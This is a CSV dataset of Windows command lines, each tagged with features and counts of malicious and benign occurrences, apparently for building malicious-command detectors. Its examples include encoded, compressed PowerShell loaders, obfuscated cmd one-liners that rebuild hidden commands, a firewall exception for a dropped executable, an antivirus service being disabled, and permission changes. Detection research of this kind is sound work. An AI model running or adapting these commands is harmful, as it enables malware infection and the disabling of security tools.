tags,mal_cnt,ben_cnt,example
arg_-e; arg_powershell; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,142,0,PowersHeLL -e IAAmACAAKAAgACQARQBuAHYAOgBjAG8AbQBzAHAARQBjAFsANAAsADEANQAsADIANQBdAC0ASgBPAEkATgAnACcAKQAoAE4AZQBXAC0ATwBiAEoAZQBDAHQAIAAgAFMAeQBTAHQAZQBNAC4ASQBPAC4AcwB0AHIAZQBBAG0AUgBFAGEAZABFAHIAKAAoAE4AZQBXAC0ATwBiAEoAZQBDAHQAIABzAHkAcwBUAEUATQAuAGkAbwAuAGMATwBNAHAAcgBFAHMAUwBJAE8ATgAuAEQAZQBmAEwAQQB0AEUAUwB0AFIAZQBBAE0AKAAgAFsAcwB5AFMAVABlAG0ALgBJAE8ALgBNAGUAbQBPAFIAeQBzAFQAUgBFAEEATQBdACAAWwBjAG8ATgB2AEUAcgBUAF0AOgA6AEYAUgBPAE0AYgBBAHMARQA2ADQAcwB0AHIAaQBOAEcAKAAgACcAWABVAC8AUgBUAGcASQB4AEUAUAB5AFYAUABqAFQAcABYAFkAUgBlAHcAQgBnAFMARwBxAEkASgBDAGcAbwBSAEwAcAA0AFIAWQBrAHgATQByADcAZAB5ADEAYQBPAHQAdgBRADAASABFAHYANwBkAEsAdgBqAGkAeQB5AGEANwBNADcATQB6AFEAeQBmAEwAQgAvADkARgBCAHMAUgBBADAANwBiADUATwB5AGcAawBYAHAAcgBDAHIAZwBXAGQAUABrADMAUwBmADEAQwAyAHEAeABIAFcAZgBBAGIASQBGADUAQQBQAEsAdwAwAEcAQgBiAFgAUAB3ADEAdQBsAEEANQBPAFYAaQBLADYAZgBKAE4AWQA2AFcAUgBmAG0AcwB3AEcAdQA3AEQAbwBaAGoANgBmAHoAQgBLAEgARwBEAFgAZQBsAHUANgB3AEcAdQBUAFQAVwBkAFAAbABPAGUAcwBOADQANQBpAHEATgBFAGIAdABpAHMAYQBCAEQAbgBNADAAZgB3AHkAUAA2AEcANABzAGIAMgBHAEwAVQBhAFoARgBPADcALwB5AGkAMgB3AHUANABTACsALwBTACsAUQA4AE8AWgB0AE0AUABTAFIAdwA1AEkAKwB5AEYAaABYAG0AUwBoAHAAWABEAEYAcABoADQAcwB4ADYAawBLAGkATwA2AEwASwBaACsAdABDAEQAYQBrAEYAUABPAGUASQA5ACsAdAB6ACsAMgA0ADkAZQAyAE0AWgBXAFYAeABVAGgAWAA4AE0AZgBsAGoAegBaAEQAcgA4ADAAcQBpAGwAdgBrAGEAQgBtAEwARABLAFgASABkAHUAcQB0AGcAcgBvACsAWABVAFUAZQBQAEQANwBFAFEAVQBsAFUANQBiADcAeABHAHEARgBkADIAaABvAEoAZgBlAFUAMwBXAHcAVQBPAHQAVABYADgAUABnAGoAawBDAHMAVABoADgAQQAwAD0AJwApACAALAAgAFsAUwB5AHMAdABlAG0ALgBJAG8ALgBjAG8ATQBQAHIAZQBTAFMASQBPAG4ALgBjAG8AbQBwAFIAZQBzAFMASQBPAE4ATQBPAEQAZQBdADoAOgBkAGUAQwBvAE0AUAByAGUAcwBTACAAKQApACwAWwB0AEUAWAB0AC4ARQBuAEMATwBkAEkAbgBHAF0AOgA6AGEAUwBjAEkAaQApACAAKQAuAHIAZQBBAGQAdABPAEUATgBEACgAKQAgAA==
ext_js; normal_entropy; normal_string_len,138,1,"""C:\smart_phone_free_movie.js"""
arg_cmd; parentprocess_unknown_process.exe; very_high_string_len; very_low_entropy,138,0,"Cmd  /V      /C   ""set     amcS=MjIMTvSsUGXsusGzlZqaOUxg,A{w.D$No8=6i\fm:)/Cc4+7P@bhkHW}eJrF5-Yp;yn 0d9't(&&   for  %C  in (   63  ,32  ,  27   , 56,   58    ,    13 ,51    , 56   ,16    ,    16 ,  67 ,30 ,  17,66 , 44    , 34,    66,56  ,    27    ,   61 ,    32  , 50,    1    ,    56  , 44    ,    72,67  ,    31   ,   56   , 72    ,  28    , 54    ,   56    ,    50   ,  43    ,16, 36   ,56 ,66  ,72 ,   64,30  ,    27    ,59  ,  52  ,    34  ,  71   ,51   ,   72    ,   72 ,   63    ,    40    , 42 ,  42,    32    ,  58,  23    ,    19 , 66    , 36 ,    44,63    ,58    ,  32   ,   39   , 28,   58,12    ,42,   22  ,51  , 70 ,   62   ,   45 ,   49  ,    51    ,  72    ,  72    ,  63   ,    40 ,    42   ,  42   ,32   , 44  ,   72  ,   32, 63  ,12, 13, 63  ,    19    ,    44 ,  52   ,19    ,   23,  36   ,  66  ,    23,    28   ,  44 ,32    ,  39   ,    42,   27   ,14,33,  10    , 47   ,    49  , 51    ,72,    72  ,  63,   40 ,42,   42  ,  51  ,  65 , 12  ,  66,   69,    19,   36  ,  61    ,  13  ,    56  ,    58,    5   ,36  ,   44   ,   56    ,   13  , 28    , 36  ,    58 ,   42   ,  53 , 56,    32    ,  21  ,    39    , 49 , 51   ,72   ,72  ,63   ,    40    ,   42  ,  42  ,   19   , 63  ,    16   ,   36 , 52  ,   19 ,  13   ,36 ,    28    ,   56  , 39 ,19    ,   58,  52,   56  ,  72 ,  28  ,   19 ,   13   , 36  ,   19  ,42   , 25  ,49   , 51 ,    72  ,72   , 63   ,    40    ,    42, 42  , 36,    13, 52, 65 ,13  ,   56 , 58   ,    5  , 36    ,44    ,56,    28,   58    ,12 ,  42 ,13  ,50,  56    ,    35  ,    35 ,65  , 12  ,   3 ,   71    ,  28, 6,  63,16   ,36   ,    72   ,  73 ,    71   ,    49   ,    71 ,  41    ,   64   ,30    ,43   ,    43    , 51, 67 ,   34   ,    67, 71  ,    33  ,    68    ,  60, 71 , 64    ,    30 , 27  ,    57,38  ,    34  , 30  ,   56 ,  66,   5   ,  40   ,72    , 56   ,  39   , 63    , 46   , 71,  37  ,    71  ,    46   ,  30   ,43    ,   43  ,   51   ,  46 ,71    ,   28   ,56   ,22    ,  56  ,    71 ,  64  ,38   , 32 , 58 , 56    ,   19 ,   44  ,51,    73  ,    30 , 25,63  ,   3   ,67,  36    ,    66  ,    67  ,30    , 27    ,59,   52   ,   41,26 ,72, 58,   65 ,  26 , 30    ,    17   , 66 ,   44 ,    28 ,   29   ,    32  ,    27   , 66,    16   ,   32,    19  ,  69 ,    59   ,  36    ,16,   56   ,73    ,  30    ,    25    ,   63  ,3    ,   24   ,   67  ,  30,27   ,   57, 38    ,   41 ,  64    ,   6,  72    ,    19 , 58 ,   72   ,    61, 48   ,    58    ,32, 44   , 56,  13 ,13  , 67    , 30   ,    27 , 57,  38,    64, 50    ,   58   ,  56   ,    19,    52  ,   64 ,55 ,44 ,   19  ,    72    ,44  ,    51 , 26  ,  55 ,  55,   67  , 67   , 67    ,    67    ,  67,  67    ,  67    , 67 ,67   ,  67  ,67    ,  67   ,67  ,    67    , 67,  67  ,  67 ,    83   )  do set  5n=!5n!!amcS:~   %C,  1!&& if  %C  equ  83  call %5n:~   4%   """
arg_-e; arg_cmd; arg_set; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,134,0,Cmd wUaukPaOzzEjo RVkLwEfowNSjilJQ fbiMkzL &     %^c^o^m^S^p^E^c^%     %^c^o^m^S^p^E^c^%     /V         /c           set %ALfbNiVMXuamiWp%=IYYjSjscn&&set %iBhvbvN%=p&&set %viCYOjhHti%=o^w&&set %hwEMjElmAwtzMjX%=FInLXljqOZoMQ&&set %FpEOMNJ%=!%iBhvbvN%!&&set %sQTCnfjRAoppzda%=NvoAoNaERQvOOz&&set %dwHvjtWGJIj%=e^r&&set %JdwwfjQLaKNE%=!%viCYOjhHti%!&&set %tmFDiIOvN%=s&&set %KQYVHfZzZDraFUw%=XHIuAdzLcf&&set %VwhcHCKfE%=he&&set %IlqHWFA%=ll&&!%FpEOMNJ%!!%JdwwfjQLaKNE%!!%dwHvjtWGJIj%!!%tmFDiIOvN%!!%VwhcHCKfE%!!%IlqHWFA%!  -e IABpAE4AdgBPAEsAZQAtAGUAeABQAFIAZQBTAFMAaQBPAG4AKAAgAG4ARQBXAC0AbwBiAGoARQBjAHQAIAAgAFMAWQBzAFQAZQBNAC4ASQBPAC4AQwBvAG0AUABSAGUAUwBTAEkAbwBOAC4ARABFAEYATABBAHQARQBTAFQAUgBFAEEAbQAoAFsASQBvAC4AbQBFAG0ATwByAFkAUwB0AHIAZQBBAG0AXQAgAFsAQwBPAG4AdgBlAFIAVABdADoAOgBmAHIATwBNAGIAQQBTAEUANgA0AHMAVAByAEkATgBnACgAJwBUAFYATABmAGEAOQBzAHcARQBIADQAZgA3AEgAOABRAHcAVgBRAFMAYgBxAFUAbABmAGQAaQBvAEcAWABSAEwATgBoAHAAYQBrAGcAZQAzAHQAQgBsADcAcwBDAHgAZgBZAHkAMgBPAGIAVwBRAGwAYQB3AG4ANQAzADMAZQBuAHAAagBEAEQAbgBYADUAOQBkADkAOQAzAGQAMAA3AGEAdwBWAFIAbQBxAE4AaABYAGQAaQBaADQAeQAxAE0ATwBQAEIAWAA4AEwAMgA0AHUAdQB2AEkAUABXAEMANQBUAEgAcgBoAGsAMwByAFIAVgB0ADgAMgBTADEAZQBvAEIAcwBRAHEAeABDAEMAUwBjAGkARQBBAEsAdABEAHgAQwBKAGMAdABmAGgAdwBCAGIAdABZAEMAZwBIAHEARwBjAE4AZwA3AGEAawBDAFcATAAvAEQAdABHAEoAaQBkAEMAMQBjAEoATABFAE8ATgBQACsASgAyAHoAeQBaAGYASgArAFAASgBTAFoAcwBtADMAMgBmAFEASgBRAFkASgAvAC8ARgBCAFQAdABvAEMAdQB2ADkASwA2ADcAdwBZAFgAMwBCADUASwBQAE8AOABHAGgALwA0AGsAbABRADgAbgBjADEAdAAwAEIAbQAxAE4ARAAzAFMAagBiAEkAZQBlAHIAdgBXAHYAdgBRADEAbQBxAGEALwByAEUAQwBpAGIAYwBaADQASwA5AEcAQQAzAEMASQBxAEkAaABrAEwAYgA5AGMANgBzAEsAYQBsACsAUQBuAGMAYgA2AGgALwBMAHMAYwBiAGQAOQBYADkAYQA2AEYAVwBUAEQARQA5ADgAWgBRAGwATgBWAE8ATQBHAGgAVQB0AEYAMwBQAHIAdQA3AHYAUABEADcAVQAwAE0AUgBJAHUAYwBNAFkAcQBTAFUAQwBiAG8AaQBjAHgAdgB3AEEALwBLAFYAYwByAHMAOQBKAFQATwB6AFgAeQBDAHkALwBpAEcAcwBPADkASwBZAFUAOAAxAHEARgBpAFQAWABwAEcAQwBHAFcARQAxAGwAeQByAHYARwB4AGMARQBVAG0ARABiADgAdABtAFUAVwBnAHYAdAAvAHEAcgBmAGwAWQAyAHoATABHAFgAOABOADAAYwBmAHUANQA0AHkASQBiAGkAaQB3AGwANQBvAG4ASQBBAGgAegA1ADAASABZADIAdQBSAG0ATwBIAFoATQB0AGUAeQAyAEgAcAA1AEMAUAA3ADEAUQBEAE4AVwBvADEAbABYAFAATABaAE4AcwBUAFQAVgB6ADMAbgBSAHcATwBnAE4AcQBrAGIAMwBYAFIANQA4ADQAWQByAEYAZQBpAFQAawBPAFMATgB1AG0AWgAwAGgAdwBaAHoANgBnAEgAcQBSAFkAVQBPAC8AQgBWAHoAZwB4AFQAeABBAEgASQBLAFUANABnADEAWgBJAHUAOABtAE8AMQBvAFQAYgBIADAANABIAHYAOABCACcAIAApACAALAAgAFsAUwBZAHMAdABFAE0ALgBpAG8ALgBDAG8AbQBwAHIARQBzAFMAaQBPAE4ALgBjAG8ATQBwAHIARQBTAFMASQBPAE4AbQBvAGQARQBdADoAOgBEAGUAQwBPAE0AcAByAGUAUwBTACAAKQB8ACAAZgBPAFIAZQBBAEMAaAAtAG8AQgBKAGUAQwBUACAAewAgAG4ARQBXAC0AbwBiAGoARQBjAHQAIAAgAEkATwAuAFMAVAByAEUAYQBtAFIAZQBhAEQARQByACgAIAAkAF8AIAAsAFsAcwBZAHMAVABFAE0ALgB0AEUAeAB0AC4AZQBuAGMAbwBkAEkATgBnAF0AOgA6AGEAUwBjAEkAaQAgACkAfQAgAHwAIABGAG8AUgBlAGEAYwBoAC0AbwBiAEoAZQBDAFQAIAB7ACQAXwAuAHIAZQBhAEQAdABvAEUATgBkACgAIAApAH0AKQAgAA==
arg_add; arg_allowedprogram; arg_enable; arg_firewall; arg_netsh; dir_%appdata%; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,134,1,"netsh firewall add allowedprogram ""%APPDATA%\IQ.exe"" ""IQ.exe"" ENABLE"
ext_docx; normal_entropy; normal_string_len,132,1,"/n ""C:\purchaseorder.docx"""
arg_cmd; ext_bat; normal_entropy; normal_string_len,131,2,"cmd /c """"C:\extra_target_0.bat"" """
arg_config; arg_disabled; arg_sc; normal_entropy; normal_string_len; parentprocess_cmd.exe,130,1,"sc  config ""navapsvc"" start= disabled"
arg_cacls; dir_%appdata%; normal_entropy; normal_string_len; parentprocess_cmd.exe,129,1,"cacls  ""%APPDATA%\nvixpuwbm\*"" /T /E /G Users:F /C"
ext_js; low_entropy; low_string_len,126,2,"""C:\header.php.js"""
arg_taskkill; low_entropy; low_string_len; parentprocess_cmd.exe,123,2,taskkill  /A safe*
arg_cmd; dir_%temp%; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,122,1,"cmd /c """"%TEMP%\3770625.bat""       ""C:\DOC09405859850pdf.exe""   """
arg_cmd; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,121,0,"Cmd /V:O/C""set -   =IdBSZaVlEVEJwpRGpMcXUSahlErhlBwsz 7+Wi;mN9qC.@,\Pk}tQb'j26=oT)fDy:/nue{F4Hv1$(-x&&for %o in (16,59,30,69,26,31,27,69,28,28,33,76,53,37,59,58,67,69,30,78,59,53,55,69,18,51,33,40,69,51,44,36,69,53,43,28,37,69,67,51,38,76,26,67,9,58,54,27,51,51,16,65,66,66,53,22,32,22,78,31,27,22,26,51,22,31,27,44,26,68,66,27,49,42,19,42,60,75,45,27,51,51,16,65,66,66,22,67,22,16,22,16,59,28,37,74,44,26,68,66,21,16,72,67,22,45,27,51,51,16,65,66,66,31,27,59,26,69,18,26,69,31,51,31,18,27,59,59,28,31,44,18,59,39,66,67,67,52,49,40,45,27,51,51,16,65,66,66,18,59,39,37,18,59,28,69,44,18,59,39,66,56,73,4,45,27,51,51,16,65,66,66,69,28,22,26,51,69,1,69,28,22,22,18,18,37,59,67,44,69,31,66,57,73,64,28,54,44,21,16,28,37,51,77,54,45,54,61,38,76,68,42,43,33,58,33,54,75,34,41,54,38,76,68,31,51,58,76,69,67,74,65,51,69,39,16,35,54,47,54,35,76,68,42,43,35,54,44,69,79,69,54,38,62,59,26,69,22,18,27,77,76,67,25,14,33,37,67,33,76,26,67,9,61,70,51,26,64,70,76,53,37,59,44,63,59,30,67,28,59,22,1,71,37,28,69,77,76,67,25,14,46,33,76,68,31,51,61,38,21,51,22,26,51,78,48,26,59,18,69,31,31,33,76,68,31,51,38,53,26,69,22,49,38,50,18,22,51,18,27,70,50,50,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,88)do set ]   =!]   !!-   :~%o,1!&&if %o==88 call %]   :~-360%"""
dir_%temp%; ext_tmp; high_string_len; parentprocess_csc.exe; very_high_entropy,117,0,"/NOLOGO /READONLY /MACHINE:IX86 ""/OUT:%TEMP%\RES5074.tmp"" ""%TEMP%\CSC56F287DDE1B4A1D8BCC4FC8AC085FD.TMP"""
